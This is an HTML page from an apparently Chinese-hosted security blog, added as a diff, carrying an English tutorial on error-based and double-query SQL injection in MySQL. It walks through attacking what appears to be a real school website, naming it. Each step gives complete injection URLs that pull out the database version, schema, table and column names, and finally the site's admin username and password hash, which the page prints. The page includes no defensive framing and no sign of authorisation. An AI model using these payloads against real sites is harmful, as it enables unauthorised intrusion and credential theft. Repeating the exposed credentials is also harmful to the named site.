@@ -1,0 +1,501 @@
+
+ <!DOCTYPE HTML>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  
+    <title>SQLi--PART IV:Error Based/Double Query SQL injection |     tudouya&#39;s secblog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
+    
+    <meta name="author" content="tudouya">
+    
+    <meta name="description" content="PrefaceAlright I’ll make this tutorial as short as possible so that you can understand faster.
+Understanding Error Based/Double QueryHow does Error Ba">
+    
+    
+    
+    
+    <link rel="alternative" href="/atom.xml" title="    tudouya&#39;s secblog" type="application/atom+xml">
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="stylesheet" href="/css/style.css">
+    <link href="//cdn.bootcss.com/highlight.js/9.1.0/styles/railscasts.min.css" rel="stylesheet">
+    <style type="text/css">
+      figure {
+        overflow-x: auto;
+      }
+    </style>
+</head>
+
+  <body>
+    <header>
+      <div>
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="    tudouya&#39;s secblog">    tudouya&#39;s secblog</a></h1>
+				<h2 class="blog-motto">~The quieter you become,the more you can hear~</h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="菜单">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					<ul>
+					 
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+						<li><a href="/sitemap.xml">sitemap</a></li>
+					
+						<li><a href="/about">About</a></li>
+					
+					<li><form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="search" id="search" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:sec.php101.cn">
+					</form></li>
+				</ul>
+			</nav>
+</div>
+    </header>
+    <div id="wrap">
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+    <time datetime="2014-11-09T17:32:16.000Z" itemprop="datePublished">
+      <a href="/2014/11/10/SQLi--PART-IVError-BasedDouble-Query-SQL-injection/" title="SQLi--PART IV:Error Based/Double Query SQL injection" itemprop="url" class="article-time">2014-11-10</a>
+    </time>
+
+  <h1 itemprop="name" class="article-name">
+    
+      <a href="/2014/11/10/SQLi--PART-IVError-BasedDouble-Query-SQL-injection/" title="SQLi--PART IV:Error Based/Double Query SQL injection" itemprop="url"><span>SQLi--PART IV:Error Based/Double Query SQL injection</span></a>
+  </h1>
+</header>
+
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">文章目录</strong>
+		
+			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Preface"><span class="toc-number">1.</span> <span class="toc-text">Preface</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Understanding-Error-Based-Double-Query"><span class="toc-number">2.</span> <span class="toc-text">Understanding Error Based/Double Query</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#How-do-you-know-you-should-use-Error-Based-Double-Query-Important"><span class="toc-number">3.</span> <span class="toc-text">How do you know you should use Error Based/Double Query? (Important!)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lets-start-with-Error-Based-SQL-injection"><span class="toc-number">4.</span> <span class="toc-text">Lets start with Error Based SQL injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#First-approach-is-knowing-the-version-of-the-database"><span class="toc-number">4.1.</span> <span class="toc-text">First approach is knowing the version of the database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Second-step-Getting-the-database-name"><span class="toc-number">4.2.</span> <span class="toc-text">Second step: Getting the database name</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Third-Step-Getting-the-TABLE-NAMES"><span class="toc-number">4.3.</span> <span class="toc-text">Third Step: Getting the TABLE NAMES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fourth-Step-Getting-Columns-from-specific-TABLE-NAMES"><span class="toc-number">4.4.</span> <span class="toc-text">Fourth Step: Getting Columns from specific TABLE NAMES</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fifth-Step-Extracting-the-data-from-Columns"><span class="toc-number">4.5.</span> <span class="toc-text">Fifth Step: Extracting the data from Columns</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Now-Lets-Start-with-DOUBLE-Query-SQL-Injection"><span class="toc-number">5.</span> <span class="toc-text">Now Lets Start with DOUBLE Query SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Step1-Getting-the-database-version"><span class="toc-number">5.1.</span> <span class="toc-text">Step1: Getting the database version</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step2-Getting-the-Database"><span class="toc-number">5.2.</span> <span class="toc-text">Step2: Getting the Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step3-Getting-the-Table-Names"><span class="toc-number">5.3.</span> <span class="toc-text">Step3: Getting the Table Names</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step4-Getting-Column-names-from-specific-Tables-and-Database"><span class="toc-number">5.4.</span> <span class="toc-text">Step4: Getting Column names from specific Tables and Database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Step5-Getting-the-Data-from-the-Columns-with-the-help-of-Table-name-and-Database-name"><span class="toc-number">5.5.</span> <span class="toc-text">Step5: Getting the Data from the Columns with the help of Table name and Database name</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">6.</span> <span class="toc-text">Conclusion</span></a></li></ol>
+		
+		</div>
+		
+		<h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>Alright I’ll make this tutorial as short as possible so that you can understand faster.</p>
+<h2 id="Understanding-Error-Based-Double-Query"><a href="#Understanding-Error-Based-Double-Query" class="headerlink" title="Understanding Error Based/Double Query"></a>Understanding Error Based/Double Query</h2><p>How does Error Base and Double Query work.<br><strong>Error Based:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A method of extracting information from a database when UNION SELECT function does not work at all. This can be done using a compiled query to extract the database information.</span><br></pre></td></tr></table></figure></p>
+<p><strong>Double Query:</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Basically like Error Based, except that the Error Based Query will be doubled as a single query statement so that we&apos;ll get errors with information in it.</span><br></pre></td></tr></table></figure></p>
+<p>I’ll explain further in this tutorial.<br>Anyways, focus on this part of this tutorial:</p>
+<blockquote>
+<p>Error Based IS Double Query<br>Error Based = Double Query (Error based 2x)</p>
+</blockquote>
+<h2 id="How-do-you-know-you-should-use-Error-Based-Double-Query-Important"><a href="#How-do-you-know-you-should-use-Error-Based-Double-Query-Important" class="headerlink" title="How do you know you should use Error Based/Double Query? (Important!)"></a>How do you know you should use Error Based/Double Query? (Important!)</h2><p>This is the most important part of web hacking; the type of injection to use in different situations.<br>You can use Error Based/ Double Query Injections in the following errors you get.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a. The Used Select Statements Have  Different Number Of Columns.</span><br><span class="line">b. Unknown Column 1 or no columns at all (in webpage and page source)</span><br><span class="line">c. Error #1604</span><br></pre></td></tr></table></figure></p>
+<p>Now take note of those errors. You’ll be needing it.</p>
+<h2 id="Lets-start-with-Error-Based-SQL-injection"><a href="#Lets-start-with-Error-Based-SQL-injection" class="headerlink" title="Lets start with Error Based SQL injection"></a>Lets start with Error Based SQL injection</h2><p>Alright for this lesson, we’ll use this site as an example:<code>http://www.aliqbalschools.org.</code></p>
+<h3 id="First-approach-is-knowing-the-version-of-the-database"><a href="#First-approach-is-knowing-the-version-of-the-database" class="headerlink" title="First approach is knowing the version of the database"></a>First approach is knowing the version of the database</h3><p>To do that we enter this query after the end of the URLor 1 group by<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1--</span><br></pre></td></tr></table></figure></p>
+<p>So the site will look like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 or 1 group by concat_ws(0x3a,version(),floor(rand(0)*2)) having min(0) or 1--</span><br></pre></td></tr></table></figure></p>
+<p>Results:<br><img src="https://raw.githubusercontent.com/tudouya/blogSource/master/images/TIqze.png" alt="">  </p>
+<p>Now that we know the version of the database which is 5, lets move to the next step</p>
+<h3 id="Second-step-Getting-the-database-name"><a href="#Second-step-Getting-the-database-name" class="headerlink" title="Second step: Getting the database name"></a>Second step: Getting the database name</h3><p>To get the database, we enter this query:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>Notice the limit function in the query.A website can have more than 2 two databases, so increase the limit until you find all database names.Example: limit 0,1 or limit 1,1 or limit 2,1</p>
+</blockquote>
+<p>Now our website address will look like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Second step is done where we extract the database names we need.MAKE sure you write the database name on a paper or notepad.We’ll need it later.</p>
+<h3 id="Third-Step-Getting-the-TABLE-NAMES"><a href="#Third-Step-Getting-the-TABLE-NAMES" class="headerlink" title="Third Step: Getting the TABLE NAMES"></a>Third Step: Getting the TABLE NAMES</h3><p>Table names is what we need now.<br>Here’s the query we can use:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Don’t also forget the LIMIT function we used here to get table names one by one.<br>Alright our web address will look like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 19,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Now here’s the important part:<br>When you search for tables keep incrementing the limit until you find the valuable table name<br>For example: LIMIT 0,1<br>LIMIT 1,1<br>LIMIT 2,1<br>Keep increasing the number until you find the table you want to extract the information from.<br>Here’s the formula: LIMIT N,1 where N is a random integer  </p>
+<p>So now we know our table, lets move on to the next step.</p>
+<h3 id="Fourth-Step-Getting-Columns-from-specific-TABLE-NAMES"><a href="#Fourth-Step-Getting-Columns-from-specific-TABLE-NAMES" class="headerlink" title="Fourth Step: Getting Columns from specific TABLE NAMES"></a>Fourth Step: Getting Columns from specific TABLE NAMES</h3><p>Alright, now that you’ve chosen the table you wanna extract columns from, time to execute another query.<br>So here’s how a column query extraction will look like:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0xTABLEHEX limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Notice the LIMIT 0,1 FUNCTION and 0xTABLEHEX.<br>You need to convert your specific table into hex and add 0x at the beginning of the string so that it can be readable to the website.<br>To convert a string to hex use: <a href="http://www.swingnote.com/tools/texttohex.php" target="_blank" rel="external">http://www.swingnote.com/tools/texttohex.php</a>.<br>Here’s how the address will look like along with the query:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x73657474696e6773 limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Results:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &apos;Id~1&apos; for key &apos;group_key</span><br></pre></td></tr></table></figure></p>
+<p>Now you need to increment the limit until you find valuable columns such as userName and passWord.<br>So in this case,<br>Column name = userName<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x73657474696e6773 limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Column name= passWord<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and (select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name=0x73657474696e6773 limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Again, don’t forget to see the LIMIT Function<br>Now that we found the columns we want to extract information from i.e “userName” and “passWord”, lets proceed to the next step where we can actually get the login username and password.</p>
+<h3 id="Fifth-Step-Extracting-the-data-from-Columns"><a href="#Fifth-Step-Extracting-the-data-from-Columns" class="headerlink" title="Fifth Step: Extracting the data from Columns"></a>Fifth Step: Extracting the data from Columns</h3><p>Alright this part is probably the best in SQL injecting site.<br>Time to get the info from the columns we have.<br>To do that, use this query:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select(select concat(cast(concat(COLUMN_NAME,0x7e,COLUMN_NAME) as char),0x7e)) from Databasename.TABLENAME limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Now before you proceed, watch and focus on the code and study what happens.<br>Here we have 4 variables:  </p>
+<ol>
+<li>COLUMN_NAME: where you insert the column name you want to extract information from<br>2.Databasename: where you insert the current database name of the website so that you’ll be extract info from it  </li>
+<li>TABLENAME: where you insert the table name of the column names you extracted from  </li>
+<li>LIMIT N,1: LIMIT Function and N where N is a random integer  </li>
+</ol>
+<p>Now lets do some replacing, FOCUS<br>COLUMN_NAME replace with “userName” and “passWord”<br>Databasename replace with “iqbal_iqbal”<br>TABLENAME replace with “settings” </p>
+<p>After you’re done with altering the code to your needs of extracting information, time to execute it.<br>Here’s what the code will look like:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and (select 1 from (select count(*),concat((select(select concat(cast(concat(userName,0x7e,passWord) as char),0x7e)) from iqbal_iqbal.settings limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Results:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &apos;admin~86f574c1d63d53fa804c13c3213953d9~1&apos; for key</span><br></pre></td></tr></table></figure></p>
+<h2 id="Now-Lets-Start-with-DOUBLE-Query-SQL-Injection"><a href="#Now-Lets-Start-with-DOUBLE-Query-SQL-Injection" class="headerlink" title="Now Lets Start with DOUBLE Query SQL Injection"></a>Now Lets Start with DOUBLE Query SQL Injection</h2><p>So basically, as stated above, DOUBLE Query is the same like Error Based except the query we’ll enter is gonna be double the normal error based query.<br>First off, the definition so that you can understand:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Double query SQL injection is a vulnerability that uses two queries together wrapped into one that confuses the db to a point where it spits out an error. This error gives us the info we need to leverage the database all the way to the admin panel. As a matter of fact we can pretty much dump the whole database if we want.</span><br></pre></td></tr></table></figure></p>
+<p><strong> Differences: </strong><br>Error Based Query for Database Extraction:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure></p>
+<p>Double Query for Database Extraction:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select</span><br><span class="line">concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from</span><br><span class="line">information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Now you get the idea, lets cut to the chase and go on.<br>We’ll be using the same site as above</p>
+<h3 id="Step1-Getting-the-database-version"><a href="#Step1-Getting-the-database-version" class="headerlink" title="Step1: Getting the database version"></a>Step1: Getting the database version</h3><p>Alright same as Error Based, here’s the Double query:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select</span><br><span class="line">concat(0x7e,0x27,cast(version() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from</span><br><span class="line">information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>So our Address will look like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,cast(version() as char),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p><strong>NOTE(IMPORTANT): Make sure that your queries are very well organized when you execute them, otherwise the browser will return the results as an error.</strong></p>
+<p>Results after query execution:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Duplicate entry &apos;~&apos;5.1.56-log&apos;~1&apos; for key &apos;group_key</span><br></pre></td></tr></table></figure></p>
+<h3 id="Step2-Getting-the-Database"><a href="#Step2-Getting-the-Database" class="headerlink" title="Step2: Getting the Database"></a>Step2: Getting the Database</h3><p>Now we’ve got the version, lets execute a double query on extracting the database.<br>Query for Database extraction:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct</span><br><span class="line">concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT N,1)) from</span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Notice the LIMIT Function again and make sure you don’t make mistakes in that<br>It shows that.<br>Limit N,1 where N is a random integer. Example: Limit 0,1.<br>Here’s what our address will then look like:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.schemata LIMIT 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Once more, don’t forget about the LIMIT Function.<br>So here’s the results:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iqbal_iqbal</span><br></pre></td></tr></table></figure></p>
+<h3 id="Step3-Getting-the-Table-Names"><a href="#Step3-Getting-the-Table-Names" class="headerlink" title="Step3: Getting the Table Names"></a>Step3: Getting the Table Names</h3><p>As I’ve explained above, we’ll be also using the LIMIT Function in this query.<br>Just a quick look, the query will look like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct</span><br><span class="line">concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM information_schema.tables Where</span><br><span class="line">table_schema=0xhex_code_of_database_name LIMIT N,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from</span><br><span class="line">information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Alright you need to focus on the code and see the changes.<br>There are two variables here:  </p>
+<ol>
+<li>Hex_code_databasename  </li>
+<li>LIMIT Function<br>Obviously, we need to Hex the database name we’ve just taken into record and add 0x in the beginning i.e. Database= 0xiqbal_iqbal.<br>To convert your database name into hex: <a href="http://www.swingnote.com/tools/texttohex.php" target="_blank" rel="external">http://www.swingnote.com/tools/texttohex.php</a>.<br>Now that you’ve the database into hex, lets see what our address will look like:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM information_schema.tables Where table_schema=0x697162616c5f697162616c LIMIT 19,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>LIMIT 19,1 brings us the valuable table which is “settings”.<br>Review the code and study it.</p>
+<h3 id="Step4-Getting-Column-names-from-specific-Tables-and-Database"><a href="#Step4-Getting-Column-names-from-specific-Tables-and-Database" class="headerlink" title="Step4: Getting Column names from specific Tables and Database"></a>Step4: Getting Column names from specific Tables and Database</h3><p>Now that we know what we need which are the table (settings) and database (iqbal_iqbal), lets proceed to the next step; column extraction.<br>Here’s what the query will look like:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select (SELECT distinct</span><br><span class="line">concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns Where</span><br><span class="line">table_schema=0xhex_code_of_database_name AND table_name=0xhex_code_of_table_name LIMIT N,1)) from information_schema.tables</span><br><span class="line">limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Now here we have 3 variables:  </p>
+<ol>
+<li>Hex code of Databasename: Hex the database which in our case is (iqbal_iqbal)  </li>
+<li>Hex code of tablename: Hex the table name which is “settings”  </li>
+<li>LIMIT Function<br>Alright, I’m pretty sure you know what you have to do exactly so I don’t need to explain everything again and again.  </li>
+</ol>
+<p>Here’s what the address is gonna look like:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns Where table_schema=0x697162616c5f697162616c AND table_name=0x73657474696e6773 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Notice the hexed variables and the LIMIT Function.<br>Keep incrementing the LIMIT until you find the valuable columns which in our case is “userName” and “passWord”.<br>Review what we have just done for less confusion.</p>
+<h3 id="Step5-Getting-the-Data-from-the-Columns-with-the-help-of-Table-name-and-Database-name"><a href="#Step5-Getting-the-Data-from-the-Columns-with-the-help-of-Table-name-and-Database-name" class="headerlink" title="Step5: Getting the Data from the Columns with the help of Table name and Database name"></a>Step5: Getting the Data from the Columns with the help of Table name and Database name</h3><p>Alright now that we know what we need to extract, lets get our goods.<br>As far as what we’re injected in the site, this is our information:<br>database name: iqbal_iqbal<br>table name: settings<br>column names: userName, passWord  </p>
+<p>Here’s what the query will look like first (for extracting data):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and(select 1 from(select count(*),concat((select (select</span><br><span class="line">(SELECT concat(0x7e,0x27,cast(table_name.column_name as char),0x27,0x7e) FROM `database_name`.table_name LIMIT N,1) ) from</span><br><span class="line">information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Variables:<br>table_name.column_name: Input the table name and column name you want to extract information from.  </p>
+<p>database_name.table_name: Input the database name and table name you want to extract information from.  </p>
+<p>LIMIT Function: Increment until you find the data you need.  </p>
+<p>So here’s what our address is gonna look like when we extract details from userName.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and(select 1 from(select count(*),concat((select (select(SELECT concat(0x7e,0x27,cast(settings.userName as char),0x27,0x7e) FROM `iqbal_iqbal`.settings LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Output:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admim</span><br></pre></td></tr></table></figure></p>
+<p>Query for extracting details from passWord:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.aliqbalschools.org/index.php?mode=getpagecontent&amp;pageID=21 and(select 1 from(select count(*),concat((select (select(SELECT concat(0x7e,0x27,cast(settings.passWord as char),0x27,0x7e) FROM `iqbal_iqbal`.settings LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1</span><br></pre></td></tr></table></figure></p>
+<p>Output:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">86f574c1d63d53fa804c13c3213953d9</span><br></pre></td></tr></table></figure></p>
+<p>Username: admin<br>Password: 86f574c1d63d53fa804c13c3213953d9  </p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>Alright I think that’s pretty much what you have to know about Error Based/Double Query SQL injection.</p>
+<p><br></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/A-SQLi/">A-SQLi</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/MegaSQLi/">MegaSQLi</a><a href="/tags/Error-Based/">Error Based</a><a href="/tags/Double-Query/">Double Query</a>
+  </div>
+
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://sec.php101.cn/2014/11/10/SQLi--PART-IVError-BasedDouble-Query-SQL-injection/" data-title="SQLi--PART IV:Error Based/Double Query SQL injection |     tudouya&#39;s secblog" data-tsina="undefined" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2014/11/10/SQLi--PART-VString-Based-SQL-injection/" title="SQLi--PART V:String Based SQL injection">
+  <strong>上一篇：</strong><br/>
+  <span>
+  SQLi--PART V:String Based SQL injection</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2014/11/01/SQLi--PART-IIIUnion-BasedNormal-SQL-injection/"  title="SQLi--PART III:Union Based/Normal SQL Injection">
+ <strong>下一篇：</strong><br/> 
+ <span>SQLi--PART III:Union Based/Normal SQL Injection
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="显示侧边栏"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">文章目录</strong>
